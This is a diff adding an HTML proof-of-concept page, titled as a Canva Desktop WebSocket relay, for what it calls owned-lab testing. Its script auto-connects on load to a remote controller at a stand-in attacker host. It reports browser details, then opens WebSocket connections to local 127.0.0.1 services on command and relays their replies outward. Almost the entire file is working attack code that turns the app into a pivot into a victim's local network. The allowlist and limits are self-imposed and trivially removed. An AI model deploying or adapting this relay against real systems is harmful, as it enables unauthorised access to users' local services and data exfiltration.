@@ -1,0 +1,453 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Canva Desktop controlled WebSocket relay PoC</title>
+  <style>
+    :root {
+      color-scheme: dark;
+      font-family: ui-monospace, SFMono-Regular, Consolas, monospace;
+      background: #07100d;
+      color: #e8fff5;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: grid;
+      place-items: center;
+      padding: 24px;
+    }
+
+    main {
+      width: min(920px, 100%);
+      border: 1px solid #31564a;
+      border-radius: 14px;
+      background: #0e1c18;
+      padding: 26px;
+    }
+
+    h1 { margin: 0 0 12px; font: 700 25px/1.25 system-ui, sans-serif; }
+    p { color: #b9cec6; line-height: 1.5; }
+
+    dl {
+      display: grid;
+      grid-template-columns: max-content 1fr;
+      gap: 7px 14px;
+      margin: 18px 0;
+    }
+
+    dt { color: #84b6a2; }
+    dd { margin: 0; overflow-wrap: anywhere; }
+
+    button {
+      width: 100%;
+      margin: 8px 0 16px;
+      padding: 13px;
+      border: 0;
+      border-radius: 8px;
+      background: #a8f05b;
+      color: #102008;
+      font: 700 16px/1.2 system-ui, sans-serif;
+      cursor: pointer;
+    }
+
+    pre {
+      min-height: 300px;
+      max-height: 52vh;
+      margin: 0;
+      padding: 16px;
+      overflow: auto;
+      overflow-wrap: anywhere;
+      white-space: pre-wrap;
+      border: 1px solid #31564a;
+      border-radius: 8px;
+      background: #050c09;
+      line-height: 1.5;
+    }
+
+    .connected { color: #a8f05b; }
+    .error { color: #ff8f98; }
+  </style>
+</head>
+<body>
+  <main>
+    <h1>Controlled WebSocket relay</h1>
+    <p>
+      Owned-lab demonstration. The remote operator can select one of the fixed
+      WebSocket targets below, send application-protocol frames, and receive
+      the target's replies through the controller channel. The target list and
+      traffic limits are PoC-side safeguards, not Canva restrictions.
+    </p>
+    <dl>
+      <dt>Page origin</dt><dd id="origin"></dd>
+      <dt>Controller</dt><dd id="controller"></dd>
+      <dt>Allowed targets</dt><dd id="targets"></dd>
+      <dt>Status</dt><dd id="status">initializing</dd>
+    </dl>
+    <button id="reconnect" type="button">Reconnect controller</button>
+    <pre id="log" aria-live="polite"></pre>
+  </main>
+
+  <script>
+    (() => {
+      "use strict";
+
+      // Add only tester-owned destinations needed for the current lab run.
+      // This allowlist is deliberately imposed by the PoC. Canva does not
+      // provide or enforce an equivalent destination restriction.
+      const ALLOWED_TARGETS = new Set([
+        "ws://127.0.0.1:8765/owned-ws",
+        "ws://127.0.0.1:1234/llm",
+        "ws://127.0.0.1:1234/system"
+      ]);
+
+      const MAX_TARGET_SOCKETS = 4;
+      const MAX_TEXT_FRAME_BYTES = 64 * 1024;
+      const MAX_BINARY_FRAME_BYTES = 256 * 1024;
+      const DEFAULT_CONTROLLER = "ws://ATTACKER_LAN_IP:8766/control";
+      const params = new URLSearchParams(location.search);
+      const controllerUrl = params.get("controller") || DEFAULT_CONTROLLER;
+      const controllerToken = params.get("token") || "CHANGE_ME";
+
+      const logNode = document.querySelector("#log");
+      const statusNode = document.querySelector("#status");
+      const reconnectButton = document.querySelector("#reconnect");
+      const targetSockets = new Map();
+      let controller = null;
+      let sequence = 0;
+
+      document.querySelector("#origin").textContent = location.origin;
+      document.querySelector("#controller").textContent = controllerUrl;
+      document.querySelector("#targets").textContent = [...ALLOWED_TARGETS].join(", ");
+
+      function now() {
+        return new Date().toISOString();
+      }
+
+      function log(message, isError = false) {
+        const line = `[${now()}] ${message}`;
+        logNode.textContent += `${line}\n`;
+        logNode.scrollTop = logNode.scrollHeight;
+        if (isError) statusNode.className = "error";
+      }
+
+      function setStatus(value, className = "") {
+        statusNode.textContent = value;
+        statusNode.className = className;
+      }
+
+      function sendController(message) {
+        if (!controller || controller.readyState !== WebSocket.OPEN) return false;
+        controller.send(JSON.stringify({
+          sequence: ++sequence,
+          time: now(),
+          ...message
+        }));
+        return true;
+      }
+
+      function serializeError(error) {
+        return {
+          name: error && error.name ? String(error.name) : "Error",
+          message: error && error.message ? String(error.message) : String(error)
+        };
+      }
+
+      function bytesToBase64(bytes) {
+        let binary = "";
+        const chunkSize = 0x8000;
+        for (let offset = 0; offset < bytes.length; offset += chunkSize) {
+          binary += String.fromCharCode(...bytes.subarray(offset, offset + chunkSize));
+        }
+        return btoa(binary);
+      }
+
+      function closeTarget(channel, code = 1000, reason = "operator close") {
+        const socket = targetSockets.get(channel);
+        if (!socket) return false;
+        targetSockets.delete(channel);
+        if (socket.readyState < WebSocket.CLOSING) {
+          socket.close(code, String(reason).slice(0, 120));
+        }
+        return true;
+      }
+
+      function closeAllTargets(reason) {
+        for (const channel of [...targetSockets.keys()]) {
+          closeTarget(channel, 1000, reason);
+        }
+      }
+
+      function openTarget(command) {
+        const channel = String(command.channel || "").trim();
+        const url = String(command.url || "").trim();
+        if (!/^[a-zA-Z0-9_.-]{1,48}$/.test(channel)) {
+          throw new Error("channel must match [a-zA-Z0-9_.-]{1,48}");
+        }
+        if (!ALLOWED_TARGETS.has(url)) {
+          throw new Error(`target is not in the PoC allowlist: ${url}`);
+        }
+        if (targetSockets.has(channel)) {
+          throw new Error(`channel already exists: ${channel}`);
+        }
+        if (targetSockets.size >= MAX_TARGET_SOCKETS) {
+          throw new Error("target socket limit reached");
+        }
+
+        const protocols = Array.isArray(command.protocols)
+          ? command.protocols.map(String).slice(0, 8)
+          : undefined;
+        const socket = protocols && protocols.length
+          ? new WebSocket(url, protocols)
+          : new WebSocket(url);
+        socket.binaryType = "arraybuffer";
+        targetSockets.set(channel, socket);
+
+        sendController({
+          type: "target.event",
+          channel,
+          event: "connecting",
+          url
+        });
+        log(`target ${channel}: CONNECTING ${url}`);
+
+        socket.addEventListener("open", () => {
+          sendController({
+            type: "target.event",
+            channel,
+            event: "open",
+            url,
+            protocol: socket.protocol || null
+          });
+          log(`target ${channel}: OPEN`);
+        });
+
+        socket.addEventListener("message", async event => {
+          try {
+            if (typeof event.data === "string") {
+              const size = new TextEncoder().encode(event.data).byteLength;
+              if (size > MAX_TEXT_FRAME_BYTES) {
+                throw new Error(`text reply exceeds ${MAX_TEXT_FRAME_BYTES} bytes`);
+              }
+              sendController({
+                type: "target.event",
+                channel,
+                event: "message",
+                dataType: "text",
+                byteLength: size,
+                data: event.data
+              });
+              log(`target ${channel}: relayed text reply (${size} bytes)`);
+              return;
+            }
+
+            const buffer = event.data instanceof Blob
+              ? await event.data.arrayBuffer()
+              : event.data;
+            const bytes = new Uint8Array(buffer);
+            if (bytes.byteLength > MAX_BINARY_FRAME_BYTES) {
+              throw new Error(`binary reply exceeds ${MAX_BINARY_FRAME_BYTES} bytes`);
+            }
+            sendController({
+              type: "target.event",
+              channel,
+              event: "message",
+              dataType: "base64",
+              byteLength: bytes.byteLength,
+              data: bytesToBase64(bytes)
+            });
+            log(`target ${channel}: relayed binary reply (${bytes.byteLength} bytes)`);
+          } catch (error) {
+            sendController({
+              type: "target.event",
+              channel,
+              event: "relay-error",
+              error: serializeError(error)
+            });
+            closeTarget(channel, 1009, "reply too large");
+          }
+        });
+
+        socket.addEventListener("error", () => {
+          sendController({
+            type: "target.event",
+            channel,
+            event: "error",
+            url
+          });
+          log(`target ${channel}: ERROR`, true);
+        });
+
+        socket.addEventListener("close", event => {
+          targetSockets.delete(channel);
+          sendController({
+            type: "target.event",
+            channel,
+            event: "close",
+            code: event.code,
+            reason: event.reason,
+            clean: event.wasClean
+          });
+          log(`target ${channel}: CLOSED code=${event.code}`);
+        });
+      }
+
+      function sendTarget(command) {
+        const channel = String(command.channel || "");
+        const socket = targetSockets.get(channel);
+        if (!socket || socket.readyState !== WebSocket.OPEN) {
+          throw new Error(`target channel is not open: ${channel}`);
+        }
+
+        const dataType = command.dataType === "base64" ? "base64" : "text";
+        if (dataType === "base64") {
+          const encoded = String(command.data || "");
+          const binary = atob(encoded);
+          if (binary.length > MAX_BINARY_FRAME_BYTES) {
+            throw new Error(`binary frame exceeds ${MAX_BINARY_FRAME_BYTES} bytes`);
+          }
+          const bytes = Uint8Array.from(binary, character => character.charCodeAt(0));
+          socket.send(bytes);
+          return { channel, dataType, byteLength: bytes.byteLength };
+        }
+
+        const data = String(command.data || "");
+        const size = new TextEncoder().encode(data).byteLength;
+        if (size > MAX_TEXT_FRAME_BYTES) {
+          throw new Error(`text frame exceeds ${MAX_TEXT_FRAME_BYTES} bytes`);
+        }
+        socket.send(data);
+        return { channel, dataType, byteLength: size };
+      }
+
+      async function executeCommand(command) {
+        const commandId = String(command.commandId || "missing");
+        try {
+          let result;
+          switch (command.action) {
+            case "agent.info":
+              result = {
+                origin: location.origin,
+                href: location.href.replace(/([?&]token=)[^&]+/i, "$1[redacted]"),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                languages: navigator.languages,
+                secureContext: window.isSecureContext,
+                userActivation: navigator.userActivation ? {
+                  isActive: navigator.userActivation.isActive,
+                  hasBeenActive: navigator.userActivation.hasBeenActive
+                } : null,
+                openTargets: [...targetSockets.keys()],
+                allowedTargets: [...ALLOWED_TARGETS]
+              };
+              break;
+            case "targets.list":
+              result = {
+                allowedTargets: [...ALLOWED_TARGETS],
+                openTargets: [...targetSockets.entries()].map(([channel, socket]) => ({
+                  channel,
+                  url: socket.url,
+                  readyState: socket.readyState,
+                  protocol: socket.protocol || null
+                }))
+              };
+              break;
+            case "ws.open":
+              openTarget(command);
+              result = { channel: command.channel, state: "connecting" };
+              break;
+            case "ws.send":
+              result = sendTarget(command);
+              break;
+            case "ws.close":
+              result = {
+                channel: String(command.channel || ""),
+                existed: closeTarget(String(command.channel || ""))
+              };
+              break;
+            default:
+              throw new Error(`unsupported action: ${String(command.action)}`);
+          }
+          sendController({ type: "command.result", commandId, ok: true, result });
+        } catch (error) {
+          sendController({
+            type: "command.result",
+            commandId,
+            ok: false,
+            error: serializeError(error)
+          });
+          log(`command ${commandId} failed: ${error.message}`, true);
+        }
+      }
+
+      function connectController() {
+        if (controller && controller.readyState < WebSocket.CLOSING) {
+          controller.close(1000, "reconnect requested");
+        }
+        closeAllTargets("controller reconnect");
+        setStatus("connecting");
+        log(`controller: CONNECTING ${controllerUrl}`);
+
+        try {
+          controller = new WebSocket(controllerUrl);
+        } catch (error) {
+          setStatus("controller construction failed", "error");
+          log(`controller construction failed: ${error.message}`, true);
+          return;
+        }
+
+        controller.addEventListener("open", () => {
+          setStatus("controller connected", "connected");
+          log("controller: OPEN");
+          sendController({
+            type: "agent.hello",
+            token: controllerToken,
+            origin: location.origin,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform
+          });
+        });
+
+        controller.addEventListener("message", event => {
+          try {
+            if (typeof event.data !== "string") {
+              throw new Error("controller commands must be text JSON frames");
+            }
+            const command = JSON.parse(event.data);
+            if (!command || command.type !== "command") {
+              throw new Error("expected a command object");
+            }
+            log(`controller command: ${command.action}`);
+            void executeCommand(command);
+          } catch (error) {
+            log(`invalid controller message: ${error.message}`, true);
+            sendController({
+              type: "protocol.error",
+              error: serializeError(error)
+            });
+          }
+        });
+
+        controller.addEventListener("error", () => {
+          setStatus("controller error", "error");
+          log("controller: ERROR", true);
+        });
+
+        controller.addEventListener("close", event => {
+          closeAllTargets("controller disconnected");
+          setStatus(`controller closed (${event.code})`, "error");
+          log(`controller: CLOSED code=${event.code}`);
+        });
+      }
+
+      reconnectButton.addEventListener("click", connectController);
+      window.addEventListener("beforeunload", () => closeAllTargets("page unload"));
+      setTimeout(connectController, 250);
+    })();
+  </script>
+</body>
+</html>
